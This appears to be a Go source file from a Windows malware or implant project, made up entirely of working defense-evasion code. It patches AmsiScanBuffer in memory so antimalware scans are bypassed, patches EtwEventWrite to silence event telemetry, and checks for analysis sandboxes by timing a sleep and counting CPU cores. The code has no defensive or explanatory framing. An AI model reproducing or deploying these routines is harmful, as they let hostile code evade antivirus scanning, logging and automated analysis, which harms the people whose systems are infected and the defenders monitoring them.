//go:build windows

package main

import (
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

func patchBytes(addr uintptr, patch []byte) {
	var old uint32
	procVirtProt.Call(addr, uintptr(len(patch)), pageRWX, uintptr(unsafe.Pointer(&old)))
	copy(unsafe.Slice((*byte)(unsafe.Pointer(addr)), len(patch)), patch)
	procVirtProt.Call(addr, uintptr(len(patch)), uintptr(old), uintptr(unsafe.Pointer(&old)))
}

// patchAMSI makes AmsiScanBuffer return E_INVALIDARG so all AMSI scans
// appear as "not applicable to this provider".
func patchAMSI() {
	amsi := syscall.NewLazyDLL("amsi.dll")
	proc := amsi.NewProc("AmsiScanBuffer")
	if proc.Find() != nil {
		return
	}
	// mov eax, 0x80070057 (E_INVALIDARG); ret
	patchBytes(proc.Addr(), []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3})
}

// patchETW replaces EtwEventWrite with ret, silencing all ETW telemetry
// from this process.
func patchETW() {
	proc := ntdll.NewProc("EtwEventWrite")
	if proc.Find() != nil {
		return
	}
	patchBytes(proc.Addr(), []byte{0xC3})
}

// isSandbox returns true when the environment looks like an automated
// analysis sandbox. Returns false for real systems.
func isSandbox() bool {
	// Sandboxes often accelerate or skip time.Sleep
	t0 := time.Now()
	time.Sleep(3 * time.Second)
	if time.Since(t0) < 2*time.Second {
		return true
	}
	// Most sandbox VMs run on 1-2 cores
	if runtime.NumCPU() < 2 {
		return true
	}
	return false
}
